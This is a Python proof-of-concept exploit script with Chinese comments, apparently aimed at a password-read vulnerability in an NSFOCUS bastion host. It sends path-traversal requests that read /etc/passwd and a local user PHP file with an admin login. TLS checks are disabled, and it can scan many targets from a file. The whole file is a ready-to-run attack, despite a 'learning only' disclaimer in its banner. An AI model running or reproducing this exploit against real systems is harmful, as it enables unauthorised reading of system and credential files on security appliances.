import requests
import argparse
requests.packages.urllib3.disable_warnings()

# 绿盟堡垒机任意用户密码读取漏洞
def Banner():
    banner = """                                           
                                     
                                    
  .--.--.     ,---,      .--.--.    
 /  /    '.  '  .' \    /  /    '.  
|  :  /`. / /  ;    '. |  :  /`. /  
;  |  |--` :  :       \;  |  |--`   
|  :  ;_   :  |   /\   |  :  ;_     
 \  \    `.|  :  ' ;.   \  \    `.  
  `----.   |  |  ;/  \   `----.   \ 
  __ \  \  '  :  | \  \ ,__ \  \  | 
 /  /`--'  |  |  '  '--'/  /`--'  / 
'--'.     /|  :  :     '--'.     /  
  `--'---' |  | ,'       `--'---'   
           `--''                    
                                    ag:  绿盟堡垒机任意用户密码读取漏洞 POC                                       
                                                @version: 1.0.0   @author by ghhycsec
                                    
              仅限学习使用，请勿用于非法测试！                                                                                               
        """
    print(banner)


def poc(url):
    if "http" not in url:
        url = "http://" + url
    payload1 = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
    payload2 = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    fullpath = url + payload1
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(fullpath, headers=header, verify=False)
        if response.status_code == 200:
            print("[+]%s 存在漏洞 " % (url))
        else:
            fullpath = url + payload2
            response = requests.get(fullpath, headers=header,verify=False)
            if response.status_code == 200:
                print("[+]%s 存在漏洞 " % (url))
            print("[-]%s 不存在漏洞 " % (url))
    except Exception as e:
        print(e)
        return


def main():
    Banner()
    parser = argparse.ArgumentParser(description="绿盟堡垒机任意用户密码读取漏洞")
    parser.add_argument("-u", "--target", help="单个目标URL")
    parser.add_argument("-f", "--file", help="包含多个目标URL的文件")
    args = parser.parse_args()

    if args.target:
        target_urls = [args.target]
    elif args.file:
        with open(args.file, "r") as f:
            target_urls = f.read().splitlines()
    else:
        print("请使用 -u 或 -f 指定目标")
        return
    for url in target_urls:
        poc(url)

if __name__ == "__main__":
    main()
